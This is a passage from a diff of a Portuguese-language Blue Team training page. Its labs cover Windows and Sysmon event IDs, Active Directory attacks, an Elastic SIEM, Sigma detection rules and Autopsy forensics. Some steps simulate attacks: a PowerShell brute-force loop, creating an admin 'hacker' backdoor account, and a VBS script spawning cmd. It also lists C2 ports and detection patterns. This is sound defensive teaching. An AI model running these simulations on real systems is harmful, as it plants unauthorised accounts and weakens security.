+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Abra o Event Viewer e navegue até os logs de segurança</div></div>
+            <div class="step-body">
+              Pressione <code>Win+R</code> → digite <code>eventvwr.msc</code> → Enter. No painel esquerdo: Windows Logs → Security. Você vai ver centenas de eventos. No painel direito, clique em "Filter Current Log" e filtre pelo Event ID <code>4624</code>.
+              <div class="box-normal">
+                <div class="box-title">Event IDs que você precisa decorar</div>
+                <div class="box-item"><strong>4624</strong> — Logon bem-sucedido</div>
+                <div class="box-item"><strong>4625</strong> — Falha de logon (senha errada)</div>
+                <div class="box-item"><strong>4648</strong> — Logon com credenciais explícitas (pass-the-hash)</div>
+                <div class="box-item"><strong>4688</strong> — Novo processo criado</div>
+                <div class="box-item"><strong>4720</strong> — Conta de usuário criada</div>
+                <div class="box-item"><strong>4732</strong> — Usuário adicionado a grupo privilegiado</div>
+                <div class="box-item"><strong>7045</strong> — Novo serviço instalado no sistema</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Simule um brute-force e veja nos logs</div></div>
+            <div class="step-body">
+              No PowerShell da VM, rode esse script que simula tentativas de login com senha errada:
+              <div class="code-block"><pre><span class="code-comment"># Simula 10 tentativas de login falhas seguidas de um sucesso</span>
+<span class="code-comment"># Substitua "SeuUsuario" pelo seu usuário Windows</span>
+<span class="code-cmd">$usuario = "SeuUsuario"</span>
+
+<span class="code-comment"># 10 tentativas com senha errada</span>
+<span class="code-cmd">1..10 | ForEach-Object {</span>
+<span class="code-cmd">  $senha_errada = ConvertTo-SecureString "senhaerrada$_" -AsPlainText -Force</span>
+<span class="code-cmd">  $cred = New-Object System.Management.Automation.PSCredential($usuario, $senha_errada)</span>
+<span class="code-cmd">  try { Start-Process cmd -Credential $cred -ErrorAction Stop } catch {}</span>
+<span class="code-cmd">}</span>
+<span class="code-cmd">Write-Host "10 tentativas falhas geradas"</span></pre></div>
+              Agora no Event Viewer, filtre por Event ID <code>4625</code>. Você vai ver 10 eventos de falha.
+              <div class="box-suspicious">
+                <div class="box-title">Brute-force — como reconhecer</div>
+                <div class="box-item">Múltiplos Event ID 4625 em sequência rápida (segundos entre eles)</div>
+                <div class="box-item">Mesmo nome de usuário, IPs de origem iguais</div>
+                <div class="box-item">Logon Type 3 (rede) ou Type 10 (RemoteInteractive = RDP)</div>
+                <div class="box-item">Após as falhas, um 4624 (sucesso) — atacante entrou</div>
+              </div>
+              Clique em um evento 4625. Examine os campos: Subject, Account Name, Logon Type, Source Network Address. Esses campos são o que você vai usar para criar regras de detecção.
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Simule criação de usuário suspeito (escalada de privilégio)</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Crie um usuário backdoor (como um atacante faria)</span>
+<span class="code-comment"># Abra PowerShell como Administrador</span>
+<span class="code-cmd">net user hacker S3nh@Secreta /add</span>
+<span class="code-cmd">net localgroup Administrators hacker /add</span>
+
+<span class="code-comment"># Depois de observar os logs, remova o usuário:</span>
+<span class="code-cmd">net user hacker /delete</span></pre></div>
+              No Event Viewer, procure Event ID <code>4720</code> (conta criada) e <code>4732</code> (adicionado a grupo Administrators). Esses dois eventos juntos em segundos = persistência de atacante.
+              <div class="box-suspicious">
+                <div class="box-title">Criação de backdoor — sinais nos logs</div>
+                <div class="box-item">4720 + 4732 em sequência no mesmo horário</div>
+                <div class="box-item">Conta criada com nome genérico ou aleatório</div>
+                <div class="box-item">Adicionada ao grupo "Administrators" ou "Remote Desktop Users"</div>
+                <div class="box-item">Criada fora do horário comercial ou por conta de serviço</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Aprenda a exportar logs para análise</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># PowerShell — exportar eventos de segurança dos últimos 24h para CSV</span>
+<span class="code-cmd">$inicio = (Get-Date).AddHours(-24)</span>
+<span class="code-cmd">Get-WinEvent -FilterHashtable @{</span>
+<span class="code-cmd">  LogName = 'Security'</span>
+<span class="code-cmd">  Id = 4625, 4624, 4720, 4732, 4688</span>
+<span class="code-cmd">  StartTime = $inicio</span>
+<span class="code-cmd">} | Select TimeCreated, Id, Message |</span>
+<span class="code-cmd">Export-Csv C:\logs_seguranca.csv -NoTypeInformation</span></pre></div>
+              Abra o CSV no Excel ou Notepad++ e leia os eventos. Essa habilidade de exportar e analisar logs é o que você vai usar todo dia como analista Blue Team.
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Os 7 Event IDs mais importantes para Blue Team</div>
+          <div class="aprendeu-item">Como um brute-force aparece nos logs — padrão de 4625 rápidos seguidos de 4624</div>
+          <div class="aprendeu-item">Como um atacante cria persistência via usuário backdoor e como isso aparece em 4720+4732</div>
+          <div class="aprendeu-item">Como exportar e filtrar logs com PowerShell para análise</div>
+        </div>
+      </div>
+    </div>
+
+
+    <div id="lab-4" class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-windows">LAB 4</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Sysmon — logs avançados e detecção de execução suspeita</div>
+          <div class="lab-meta">// process creation, network, registry · ~3h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Usar o Sysmon (que você instalou no Lab 0) para ver informações que o Windows nativo não mostra — qual processo gerou qual, hashes de executáveis, conexões de rede por processo.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Entenda os Event IDs do Sysmon</div></div>
+            <div class="step-body">
+              Os logs Sysmon ficam em: <code>Event Viewer → Applications and Services Logs → Microsoft → Windows → Sysmon → Operational</code>
+              <div class="code-block"><pre><span class="code-comment"># Event IDs do Sysmon que você vai usar muito:</span>
+
+<span class="code-value">1</span>  — Process Creation      <span class="code-comment"># qual processo foi criado, por qual processo pai, com qual hash</span>
+<span class="code-value">3</span>  — Network Connection    <span class="code-comment"># qual processo fez conexão de rede, para qual IP:porta</span>
+<span class="code-value">7</span>  — Image Loaded          <span class="code-comment"># qual DLL foi carregada por qual processo</span>
+<span class="code-value">8</span>  — CreateRemoteThread    <span class="code-comment"># injeção de código em outro processo (sempre suspeito)</span>
+<span class="code-value">10</span> — ProcessAccess         <span class="code-comment"># processo acessando memória de outro (Mimikatz, por ex)</span>
+<span class="code-value">11</span> — FileCreate            <span class="code-comment"># arquivo criado — útil para detectar dropper</span>
+<span class="code-value">12/13</span> — Registry Events    <span class="code-comment"># modificação de registro — persistência</span>
+<span class="code-value">22</span> — DNS Query             <span class="code-comment"># qual processo fez qual query DNS</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Simule execução suspeita e rastreie no Sysmon</div></div>
+            <div class="step-body">
+              Uma técnica comum de malware é usar o Word ou Excel para executar um comando PowerShell. Vamos simular isso:
+              <div class="code-block"><pre><span class="code-comment"># Abra o PowerShell e simule um processo filho suspeito</span>
+<span class="code-comment"># (simula o comportamento de um macro malicioso executando cmd)</span>
+<span class="code-cmd">Start-Process powershell -ArgumentList "-NoProfile -Command 'cmd.exe /c whoami'"</span></pre></div>
+              No Sysmon (Event ID 1), filtre por: <code>Event Viewer → Filter → Event ID 1</code>. Procure o evento criado. Clique nele e veja:
+              <div class="box-suspicious">
+                <div class="box-title">Process Creation — campos importantes no Event ID 1</div>
+                <div class="box-item"><strong>Image:</strong> caminho completo do executável criado</div>
+                <div class="box-item"><strong>ParentImage:</strong> qual processo gerou esse filho — CRITICAL</div>
+                <div class="box-item"><strong>CommandLine:</strong> argumentos usados — frequentemente revela intenção</div>
+                <div class="box-item"><strong>Hashes:</strong> MD5/SHA256 do executável — pode checar no VirusTotal</div>
+                <div class="box-item"><strong>User:</strong> qual conta executou — SYSTEM em horário estranho = alerta</div>
+              </div>
+              <div class="box-warn">
+                <strong>Regra de ouro:</strong> Se o ParentImage for Word, Excel, Outlook, ou PDF reader e o filho for cmd.exe, powershell.exe, wscript.exe ou mshta.exe — é quase sempre malicioso. Essa é uma das detecções mais confiáveis em Blue Team.
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Rastreie conexões de rede por processo (Event ID 3)</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># Faça uma conexão de rede com o PowerShell (simula C2)</span>
+<span class="code-cmd">Invoke-WebRequest -Uri "http://example.com" -UseBasicParsing</span></pre></div>
+              Agora filtre no Sysmon por Event ID 3. Encontre o evento gerado. Você vai ver: qual processo (powershell.exe) conectou em qual IP e porta. Pegue o IP, vá ao VirusTotal e pesquise.
+              <div class="box-suspicious">
+                <div class="box-title">Conexões de rede suspeitas no Sysmon ID 3</div>
+                <div class="box-item">cmd.exe ou powershell.exe fazendo conexão de rede direto (raro em uso legítimo)</div>
+                <div class="box-item">Processo de sistema (svchost, lsass) conectando em IP externo não esperado</div>
+                <div class="box-item">Porta de destino incomum: 4444, 1337, 8888 (portas típicas de C2)</div>
+                <div class="box-item">Processo em pasta temp (%TEMP%, %APPDATA%) fazendo conexão</div>
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Use o Chainsaw para analisar logs mais rápido</div></div>
+            <div class="step-body">
+              O Chainsaw é uma ferramenta gratuita que analisa Event Logs do Windows e destaca eventos suspeitos automaticamente.
+              <div class="code-block"><pre><span class="code-comment"># Baixe: github.com/WithSecureLabs/chainsaw</span>
+<span class="code-comment"># Extraia e rode no PowerShell (Administrador):</span>
+
+<span class="code-comment"># Analisa os logs de Segurança com regras Sigma pré-prontas:</span>
+<span class="code-cmd">.\chainsaw.exe hunt C:\Windows\System32\winevt\Logs\ `</span>
+<span class="code-cmd">  --sigma sigma/ `</span>
+<span class="code-cmd">  --mapping mappings/sigma-event-logs-all.yml `</span>
+<span class="code-cmd">  --output resultados.json</span></pre></div>
+              Ele vai mostrar todos os eventos suspeitos encontrados com descrição do que é cada um. É como ter um mini-SIEM local.
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Os Event IDs do Sysmon e o que cada um registra</div>
+          <div class="aprendeu-item">Como rastrear a árvore de processos — qual criou qual (fundamental em IR)</div>
+          <div class="aprendeu-item">A regra de ouro: processo Office gerando cmd.exe/powershell = malicioso</div>
+          <div class="aprendeu-item">Como ver qual processo abriu qual conexão de rede com Sysmon ID 3</div>
+          <div class="aprendeu-item">Como usar o Chainsaw para análise rápida de logs com regras Sigma</div>
+        </div>
+      </div>
+    </div>
+
+
+    <div id="lab-5" class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-windows">LAB 5</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Active Directory — entenda o que atacantes exploram</div>
+          <div class="lab-meta">// via TryHackMe · sem montar AD próprio · ~4h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Entender os conceitos de AD e os ataques mais comuns sem precisar montar um ambiente completo. Você vai usar o TryHackMe que já tem os ambientes prontos.
+        </div>
+        <div class="box-warn">
+          <strong>Por que TryHackMe aqui?</strong> Montar um AD completo em lab exige tempo e recursos. O TryHackMe tem ambientes de AD prontos e guiados que ensinam o mesmo com menos fricção. O plano gratuito cobre o suficiente para começar.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Entenda os conceitos centrais (30 min de leitura)</div></div>
+            <div class="step-body">
+              Antes de ir pro TryHackMe, entenda esses termos — você vai ver em todo incidente:
+              <div class="code-block"><pre><span class="code-label">Domain Controller (DC)</span>
+  → O servidor que gerencia tudo no AD. Se um atacante compromete o DC,
+    ele tem controle total do ambiente. Alvo #1 de ransomware enterprise.
+
+<span class="code-label">Kerberos</span>
+  → Protocolo de autenticação do AD. Funciona com "tickets".
+  → Kerberoasting: atacante pede tickets de serviços e tenta quebrar
+    offline para obter senhas. Gera Event ID 4769 em volume alto.
+
+<span class="code-label">Pass-the-Hash (PtH)</span>
+  → Atacante rouba o hash NTLM da senha (não a senha em si) e usa
+    o hash diretamente para autenticar. Event ID 4624 com Logon Type 3.
+
+<span class="code-label">DCSync</span>
+  → Atacante simula ser um DC e pede cópia dos hashes de todos os usuários.
+    Gera Event ID 4662. Se não é um DC legítimo fazendo isso = grave.
+
+<span class="code-label">BloodHound</span>
+  → Ferramenta que mapeia caminhos de escalada de privilégio no AD.
+    Atacantes usam para encontrar o caminho até o Domain Admin.
+    Defensores usam para encontrar e corrigir esses caminhos primeiro.</pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Faça os rooms de AD no TryHackMe</div></div>
+            <div class="step-body">
+              Acesse <code>tryhackme.com</code> e faça esses rooms em ordem:
+              <div class="code-block"><pre><span class="code-label">1. "Active Directory Basics"</span>          <span class="code-comment">→ gratuito, conceitos fundamentais</span>
+<span class="code-label">2. "Attacktive Directory"</span>              <span class="code-comment">→ ataque real guiado contra AD</span>
+<span class="code-label">3. "Investigating Windows"</span>             <span class="code-comment">→ investigação de incidente em AD</span>
+<span class="code-label">4. "Blue Team" path</span>                    <span class="code-comment">→ path completo de defesa</span></pre></div>
+              Cada room tem instruções passo a passo. Você recebe uma VM online — sem precisar instalar nada.
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Saiba o que observar nos logs quando AD está sob ataque</div></div>
+            <div class="step-body">
+              <div class="box-suspicious">
+                <div class="box-title">Sinais de ataque ao AD nos logs</div>
+                <div class="box-item"><strong>4769 em volume alto</strong> — Kerberoasting em andamento (pedidos de ticket de serviço)</div>
+                <div class="box-item"><strong>4624 Logon Type 3 de IP externo/incomum</strong> — possível Pass-the-Hash</div>
+                <div class="box-item"><strong>4662 com acesso ao objeto replicação</strong> — possível DCSync</div>
+                <div class="box-item"><strong>BloodHound sendo executado</strong> — alto volume de consultas LDAP de um host</div>
+                <div class="box-item"><strong>Novo Domain Admin criado</strong> — 4720 + 4728 (adicionado ao grupo Domain Admins)</div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">O que é um Domain Controller e por que é o alvo mais crítico</div>
+          <div class="aprendeu-item">Os 4 ataques principais contra AD: Kerberoasting, PtH, DCSync, BloodHound</div>
+          <div class="aprendeu-item">Os Event IDs que indicam cada tipo de ataque ao AD</div>
+          <div class="aprendeu-item">Experiência prática via TryHackMe sem precisar montar ambiente próprio</div>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- ===================== SIEM ===================== -->
+    <div id="lab-6" class="section-break">
+      <div class="section-break-tag">blue team / siem</div>
+      <div class="section-break-title">Detecção e monitoramento em tempo real</div>
+    </div>
+
+    <div class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-siem">LAB 6</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Elastic Stack — monte seu SIEM gratuito</div>
+          <div class="lab-meta">// Elasticsearch + Kibana + Beats · ~4h setup + labs</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Instalar o Elastic Stack (versão gratuita), enviar os logs do Sysmon para ele, e criar um dashboard que mostra atividade suspeita em tempo real. Esse é o workflow real de um analista Blue Team.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Instale o Elastic Stack no WSL2 ou numa VM Linux</div></div>
+            <div class="step-body">
+              O Elastic roda melhor em Linux. Use o WSL2 (Windows Subsystem for Linux) que já vem no Windows 10/11:
+              <div class="code-block"><pre><span class="code-comment"># No PowerShell como Admin — instalar WSL2</span>
+<span class="code-cmd">wsl --install</span>
+<span class="code-comment"># Reinicie, abra o Ubuntu que será instalado</span>
+
+<span class="code-comment"># No terminal Ubuntu — instalar Elasticsearch</span>
+<span class="code-cmd">wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -</span>
+<span class="code-cmd">sudo apt-get install apt-transport-https</span>
+<span class="code-cmd">echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-8.x.list</span>
+<span class="code-cmd">sudo apt-get update && sudo apt-get install elasticsearch kibana</span>
+
+<span class="code-comment"># Inicie os serviços:</span>
+<span class="code-cmd">sudo systemctl start elasticsearch kibana</span>
+<span class="code-cmd">sudo systemctl enable elasticsearch kibana</span></pre></div>
+              Acesse <code>http://localhost:5601</code> no browser — essa é a interface do Kibana (seu SIEM).
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Instale o Winlogbeat para enviar logs do Windows para o Elastic</div></div>
+            <div class="step-body">
+              O Winlogbeat é um agente que coleta Event Logs do Windows e envia para o Elasticsearch. Instale na VM Windows:
+              <div class="code-block"><pre><span class="code-comment"># Baixe em: elastic.co/downloads/beats/winlogbeat</span>
+<span class="code-comment"># Extraia para C:\Program Files\Winlogbeat</span>
+
+<span class="code-comment"># Edite o arquivo winlogbeat.yml:</span>
+<span class="code-label">winlogbeat.event_logs:</span>
+  <span class="code-label">- name: Security</span>
+  <span class="code-label">- name: Microsoft-Windows-Sysmon/Operational</span>
+  <span class="code-label">- name: System</span>
+
+<span class="code-label">output.elasticsearch:</span>
+  <span class="code-label">hosts: ["localhost:9200"]</span>
+
+<span class="code-comment"># No PowerShell (Admin) — instale como serviço:</span>
+<span class="code-cmd">cd "C:\Program Files\Winlogbeat"</span>
+<span class="code-cmd">.\install-service-winlogbeat.ps1</span>
+<span class="code-cmd">Start-Service winlogbeat</span></pre></div>
+              Agora todos os logs do Windows e Sysmon estão fluindo para o Elasticsearch em tempo real.
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Crie seu primeiro dashboard de segurança no Kibana</div></div>
+            <div class="step-body">
+              No Kibana (<code>localhost:5601</code>):
+              <div class="code-block"><pre><span class="code-comment"># Passo a passo no Kibana:</span>
+
+<span class="code-value">1.</span> Vá em Analytics → Discover
+<span class="code-value">2.</span> Crie um index pattern: "winlogbeat-*"
+<span class="code-value">3.</span> Em Discover, procure por: <span class="code-string">event.code: 4625</span>
+<span class="code-value">4.</span> Você vai ver todas as falhas de logon
+<span class="code-value">5.</span> Clique em "Save" para salvar essa busca
+
+<span class="code-comment"># Outras queries úteis para explorar:</span>
+<span class="code-string">event.code: 4624 AND winlog.event_data.LogonType: 3</span>   <span class="code-comment"># logon remoto</span>
+<span class="code-string">event.code: 1 AND winlog.event_data.Image: *powershell*</span> <span class="code-comment"># PowerShell executado</span>
+<span class="code-string">event.code: 3 AND winlog.event_data.DestinationPort: 4444</span> <span class="code-comment"># C2 porta comum</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Replique ataques do Lab 3 e observe no SIEM em tempo real</div></div>
+            <div class="step-body">
+              Agora é onde tudo se conecta. Volte ao Lab 3, refaça os ataques (brute-force, criação de usuário). Com o SIEM aberto no Kibana em tempo real, observe os eventos chegando.
+              <div class="box-warn">
+                <strong>Isso é exatamente o dia a dia de um analista SOC:</strong> SIEM mostrando alertas em tempo real, você investigando o que é real vs falso positivo. Quanto mais você praticar isso, mais rápido fica na triagem.
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Como instalar e configurar um SIEM real (Elastic Stack) do zero</div>
+          <div class="aprendeu-item">Como enviar logs de Windows e Sysmon para o Elastic com Winlogbeat</div>
+          <div class="aprendeu-item">Como criar queries KQL para detectar atividade suspeita</div>
+          <div class="aprendeu-item">O workflow real de triagem de alertas que um analista SOC faz todo dia</div>
+        </div>
+      </div>
+    </div>
+
+
+    <div id="lab-7" class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-siem">LAB 7</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Criar regras de detecção com Sigma e Elastic</div>
+          <div class="lab-meta">// da hipótese à regra ativa · ~3h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Criar uma regra de detecção do zero — da hipótese, à escrita da regra Sigma, até ativá-la no Elastic e testá-la gerando o ataque. Isso é exatamente o que um Threat Hunter faz.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Formule a hipótese (como um Threat Hunter pensa)</div></div>
+            <div class="step-body">
+              Vamos criar uma regra para detectar o ataque do Lab 4 (processo Office gerando PowerShell):
+              <div class="code-block"><pre><span class="code-comment"># Hipótese baseada em MITRE ATT&CK T1059.001 + T1566.001:</span>
+
+<span class="code-label">HIPÓTESE:</span> "Se um macro malicioso em documento Office for executado,
+ele vai criar um processo filho (cmd.exe ou powershell.exe) a partir
+de winword.exe, excel.exe, ou powerpnt.exe."
+
+<span class="code-label">PERGUNTA AOS DADOS:</span> Existem eventos Sysmon ID 1 onde o ParentImage
+contém "WINWORD" ou "EXCEL" e o Image contém "powershell" ou "cmd"?
+
+<span class="code-label">FALSO POSITIVO ESPERADO:</span> Macros legítimas administrativas —
+verificar se o usuário autorizou ou se o arquivo veio de email.</pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Escreva a regra em formato Sigma</div></div>
+            <div class="step-body">
+              Sigma é um formato universal para regras de detecção — você escreve uma vez e converte para qualquer SIEM (Elastic, Splunk, QRadar). Crie um arquivo <code>macro_spawn.yml</code>:
+              <div class="code-block"><pre><span class="code-label">title:</span> <span class="code-string">Macro Office Executando Shell</span>
+<span class="code-label">id:</span> <span class="code-value">a1b2c3d4-1234-5678-abcd-ef1234567890</span>
+<span class="code-label">status:</span> <span class="code-string">test</span>
+<span class="code-label">description:</span> <span class="code-string">Detecta processo Office gerando cmd.exe ou PowerShell</span>
+<span class="code-label">author:</span> <span class="code-string">Seu Nome</span>
+<span class="code-label">date:</span> <span class="code-value">2024/01/01</span>
+<span class="code-label">references:</span>
+  <span class="code-value">- https://attack.mitre.org/techniques/T1059/001/</span>
+<span class="code-label">logsource:</span>
+  <span class="code-label">category:</span> <span class="code-string">process_creation</span>
+  <span class="code-label">product:</span> <span class="code-string">windows</span>
+<span class="code-label">detection:</span>
+  <span class="code-label">selection:</span>
+    <span class="code-label">ParentImage|endswith:</span>
+      <span class="code-value">- '\WINWORD.EXE'</span>
+      <span class="code-value">- '\EXCEL.EXE'</span>
+      <span class="code-value">- '\POWERPNT.EXE'</span>
+      <span class="code-value">- '\OUTLOOK.EXE'</span>
+    <span class="code-label">Image|endswith:</span>
+      <span class="code-value">- '\cmd.exe'</span>
+      <span class="code-value">- '\powershell.exe'</span>
+      <span class="code-value">- '\wscript.exe'</span>
+      <span class="code-value">- '\mshta.exe'</span>
+  <span class="code-label">condition:</span> <span class="code-string">selection</span>
+<span class="code-label">falsepositives:</span>
+  <span class="code-value">- Macros administrativas legítimas</span>
+<span class="code-label">level:</span> <span class="code-string">high</span>
+<span class="code-label">tags:</span>
+  <span class="code-value">- attack.execution</span>
+  <span class="code-value">- attack.t1059.001</span>
+  <span class="code-value">- attack.t1566.001</span></pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Converta para KQL e ative no Elastic</div></div>
+            <div class="step-body">
+              Use o sigma-cli para converter a regra Sigma para KQL do Elastic:
+              <div class="code-block"><pre><span class="code-comment"># Instale sigma-cli (Python)</span>
+<span class="code-cmd">pip install sigma-cli</span>
+<span class="code-cmd">pip install pysigma-backend-elasticsearch</span>
+
+<span class="code-comment"># Converta a regra para KQL:</span>
+<span class="code-cmd">sigma convert -t kibana-ndjson -p ecs_windows macro_spawn.yml -o macro_spawn.ndjson</span>
+
+<span class="code-comment"># A query KQL gerada vai ser algo como:</span>
+<span class="code-string">(winlog.event_data.ParentImage:(*\\WINWORD.EXE OR *\\EXCEL.EXE) AND</span>
+<span class="code-string"> winlog.event_data.Image:(*\\cmd.exe OR *\\powershell.exe))</span></pre></div>
+              No Kibana: Security → Rules → Create new rule → Custom Query. Cole a query KQL. Configure para alertar quando encontrar. Defina severidade como High.
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">4</div><div class="step-label">Teste a regra — gere o ataque e confirme o alerta</div></div>
+            <div class="step-body">
+              <div class="code-block"><pre><span class="code-comment"># No PowerShell — simule o processo pai como se fosse Word</span>
+<span class="code-comment"># (renomeie o powershell para WINWORD para simular o pai)</span>
+<span class="code-cmd">$processo = Start-Process powershell -PassThru</span>
+<span class="code-cmd">$processo.MainModule.FileName</span>
+
+<span class="code-comment"># Alternativa mais realista: crie um script VBS que abre CMD</span>
+<span class="code-comment"># Salve como teste_macro.vbs:</span>
+<span class="code-string">Set shell = CreateObject("WScript.Shell")</span>
+<span class="code-string">shell.Run "cmd.exe /c whoami > C:\resultado.txt"</span>
+
+<span class="code-comment"># Execute com wscript (simula macro):</span>
+<span class="code-cmd">wscript.exe teste_macro.vbs</span></pre></div>
+              Verifique no Kibana Security → Alerts se o alerta disparou. Se sim — sua regra funciona. Você acabou de fazer Threat Hunting + criar detecção.
+            </div>
+          </div>
+
+        </div>
+
+        <div class="aprendeu">
+          <div class="aprendeu-title">✓ Você aprendeu</div>
+          <div class="aprendeu-item">Como formular uma hipótese de hunting baseada no MITRE ATT&CK</div>
+          <div class="aprendeu-item">Como escrever uma regra Sigma do zero — o formato universal de detecção</div>
+          <div class="aprendeu-item">Como converter Sigma para KQL e ativar no Elastic SIEM</div>
+          <div class="aprendeu-item">O ciclo completo: hipótese → regra → teste → alerta ativo</div>
+        </div>
+      </div>
+    </div>
+
+
+    <!-- ===================== FORENSE ===================== -->
+    <div id="lab-8" class="section-break">
+      <div class="section-break-tag">incident response + forense</div>
+      <div class="section-break-title">Investigação digital — reconstruindo o que aconteceu</div>
+    </div>
+
+    <div class="lab">
+      <div class="lab-header" onclick="toggleLab(this)">
+        <span class="lab-num lab-num-forense">LAB 8</span>
+        <div class="lab-title-block">
+          <div class="lab-title">Forense de Disco — investigue uma máquina comprometida</div>
+          <div class="lab-meta">// Autopsy, artefatos Windows, timeline · ~4h</div>
+        </div>
+        <span class="lab-toggle">▾</span>
+      </div>
+      <div class="lab-body">
+        <div class="objetivo">
+          <strong>Objetivo:</strong> Investigar uma imagem de disco de uma máquina Windows supostamente comprometida usando o Autopsy. Você vai reconstruir o que o atacante fez, quando, e como entrou.
+        </div>
+
+        <div class="steps">
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">1</div><div class="step-label">Baixe uma imagem forense de prática</div></div>
+            <div class="step-body">
+              Não vamos criar nossa própria imagem agora — existem imagens forenses criadas para treinamento:
+              <div class="code-block"><pre><span class="code-comment"># Opção 1: CyberDefenders.org (gratuito)</span>
+<span class="code-comment"># Crie conta em cyberdefenders.org</span>
+<span class="code-comment"># Vá em Labs → procure "AfricanFalls" ou "HireMe" ou "Szechuan Sauce"</span>
+<span class="code-comment"># Baixe o arquivo de evidências (contém imagem de disco)</span>
+
+<span class="code-comment"># Opção 2: Digital Corpora (imagens reais de prática)</span>
+<span class="code-comment"># digitalcorpora.org/corpora/disk-images</span></pre></div>
+              <div class="box-warn">
+                <strong>Recomendação:</strong> Comece com o lab "AfricanFalls" no CyberDefenders. Ele tem um nível acessível e cobre os artefatos mais importantes.
+              </div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">2</div><div class="step-label">Abra a imagem no Autopsy</div></div>
+            <div class="step-body">
+              Baixe o Autopsy em <code>sleuthkit.org/autopsy</code>. É gratuito e tem interface gráfica.
+              <div class="code-block"><pre><span class="code-value">1.</span> Abra Autopsy → New Case → dê um nome ao caso
+<span class="code-value">2.</span> Add Data Source → Image File → selecione a imagem .dd ou .E01
+<span class="code-value">3.</span> Marque todos os módulos de ingestão (especialmente: Recent Activity, 
+   Hash Lookup, Keyword Search, Web Artifacts)
+<span class="code-value">4.</span> Aguarde a análise automática (pode demorar 10-30 min)
+<span class="code-value">5.</span> Explore o painel esquerdo</pre></div>
+            </div>
+          </div>
+
+          <div class="step">
+            <div class="step-header"><div class="step-n">3</div><div class="step-label">Investigue os artefatos — responda as perguntas de IR</div></div>
+            <div class="step-body">
+              Em qualquer investigação de IR, você precisa responder: <strong>Quem, O quê, Quando, Como, Onde</strong>. O Autopsy organiza os artefatos assim:
+              <div class="code-block"><pre><span class="code-comment"># No painel esquerdo do Autopsy, explore:</span>
+
+<span class="code-label">Results → Extracted Content → Recent Documents</span>
+<span class="code-comment">→ Quais arquivos o usuário abriu recentemente?</span>
+<span class="code-comment">→ Arquivo suspeito = potencial vetor de infecção</span>
+
+<span class="code-label">Results → Extracted Content → Shell Bags</span>
+<span class="code-comment">→ Quais pastas foram navegadas no Explorer?</span>
